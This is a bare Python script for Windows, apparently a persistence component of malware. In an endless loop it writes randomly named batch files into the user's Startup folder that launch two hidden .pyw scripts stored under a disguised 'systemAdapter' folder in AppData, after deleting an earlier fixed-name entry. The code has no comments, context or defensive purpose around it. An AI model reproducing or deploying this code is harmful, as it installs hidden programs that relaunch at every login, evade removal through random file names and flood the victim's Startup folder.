import os.path
import os
from random import choice

login = os.getlogin()

file_path = f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\lsSetup.pyw"
file_path_2 = f"C:\\Users\\{login}\\AppData\\Roaming\\systemAdapter\\reinstaller.pyw"

while True:
	if os.path.exists(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemAdapter.bat"):
		os.remove(f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\systemAdapter.bat")
	bat_path = f"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
	for i in range(30):
		bat_path += choice("1234567890QWERTYUIOPASDFGHJKKLZXCVBNMqwertyuiopasdfghjklzxcvbnm")
	with open(bat_path, "w") as bat_file:
		bat_file.write(f"start {file_path}\nstart {file_path_2}")